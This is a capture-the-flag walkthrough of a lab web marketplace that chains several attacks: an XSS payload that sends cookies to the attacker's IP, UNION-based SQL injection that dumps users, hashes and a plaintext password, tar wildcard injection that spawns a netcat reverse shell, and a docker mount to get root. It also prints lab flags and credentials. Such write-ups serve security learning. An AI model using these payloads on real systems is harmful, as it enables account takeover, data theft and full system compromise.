```

we visit the website (port 80 and 32768 look identical)

meet `jake` and `michael`

signup, then login

we are not authorized to visit `/admin` dir...yet

when trying to create a new listing I tried to enable the upload button from code inspector but no use

the hint said to look around the report option...when you report a listing to admins you get a message back

I tried to check for xss and yup...

when creating a ne listing the most basic checks works with

`<script>alert(1)</script>`

But what do we do with this? 

oh...cookies! took me some time!

there is a `token` cookie that register your session...decoding it with jwt.io is not really helpful

But combined with the XSS vulnerability we can do some `Cookie stealing` and get admin's

Basically we forge a cookie-stealing Reflected Xss payload like...

`<script>new Image().src="http://10.8.226.203:8080/?"+document.cookie;</script>`

It obviously sends the user's cookie to our machine server on specified port (8080 for me)

then start a listener on said port

We use it when creating our new listing...

And get our own cookie

```
└──╼ $nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 33142
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZmxvIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE2NDI4NTIwMTd9.jIodXdkw16d4Hlb3cecsHd3KqHuRuTqvVv7EsWnObzc HTTP/1.1

```
Now report that listing to admins! 

its obviously a malicious listing...stealng people's cookies

(make sure to keep the listener alive)

We wait a bit and get admin's cookie

Note that I think it was unrealistically fast for a Reflected Xss (you usually wait for people to click on your malicious link wich may takes long)

This is probably running automatically with a cron-like job

```
└──╼ $nc -lnvp 8080

```

Now replace your poor-people's cookie with extra-privileges flavored admin's cookie

You can just use the inspector/storage to change token's value

First flag is Right on administration panel

`THM{what_are_you_buying}`

You can also see there are 2 admins, `jake` and `michael`

I clicked on michael and noticed the url was like

`http://10.10.228.67/admin?user=2`

And I made it go like

`http://10.10.228.67/admin?user=2'`

Then It start acting 

```
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

And I was like "chill bro its a simple colon" And went 

`http://10.10.228.67/admin?user=0 union select 1,2,3,4`

It then calmed down and gave me `user 1` So I said

`http://10.10.228.67/admin?user=0 union select version(),2,3,4`


It replied `User 8.0.21`...

At this point you can get anything from that UNION-Based SQLi

database

`http://10.10.228.67/admin?user=0 union select database(),2,3,4`

tables

`0 union select group_concat(table_name),database(),3,4 from information_schema.tables where table_schema='marketplace'`

columns

`10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='users'`

So for the basic informations

```
database = marketplace
version = 8.0.21
tables = users , items, messages
columns = id,isAdministrator,password,username
```
Now we all would go straiht to `password` column

```
$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,

$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,

$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,

$2b$10$daomPlspz0EKa7wbtEQfeu1DGUWIiLxejvz/i2s3dMkE4SAxoq.Da

```
(remove the concat colon separator though)

If you didnt recognize it (with that ugly $2b$) its `BCRYPT`

your time-wasting nightmare! crackin those would take years for me

if the hash was even actually in rockyou.txt

So I went for help and you can actually dig deeper in the database

For the columns you go

`10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='messages'`

and get `id,is_read,message_content,user_from,user_to`

So you concat that with `10.10.228.67/admin?user=0 union select group_concat(id,message_content),database(),3,4 from messages`

And bingo!

There are passwords in messages? who would know???

anyway we got ssh access now:

`jake:@b_ENXkGYUCAv3zJ`

Get the use flag

```
jake@the-marketplace:~$ cat user.txt
THM{a_user_flag_for_one_dollar}
```

## privilege escalation

The classics first

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
    
```

uh? we run backups as michael? what is michael backing up?

```
jake@the-marketplace:~$ id michael
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
That bad boi michael is in docker group

```
jake@the-marketplace:~$ cd /opt/backups
jake@the-marketplace:/opt/backups$ cat backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

I just googled that last line with "privilege escalation"

Its called [wildcard injection](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/) as it seems

Tried the artcle's demo method

```
jake@the-marketplace:/opt/backups$ echo 'echo "jake ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > demo.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- "--checkpoint-action=exec=sh demo.sh"
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar demo.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
```
But we can't add jake to sudoers (michael cannot do that)

I found another method...as demo.sh is executed, we can just make it a reverse shell

```
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 2311 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ chmod 777 shell.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
rm: cannot remove '/tmp/f': No such file or directory
```
```
└──╼ $nc -lnvp 2311

$ id

```
We are michael now...we have docker power

Docker is a root servce so we can mount it on our machine for root shell

you can visit Gtfobins for this one

First get comfortable

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
michael@the-marketplace:/opt/backups$
```

second get root

```
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

then get paid!

```
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{a_root_flag_for_about_three_fiddies}

```

Nice customer service

Would recommand this marketplace 100% !
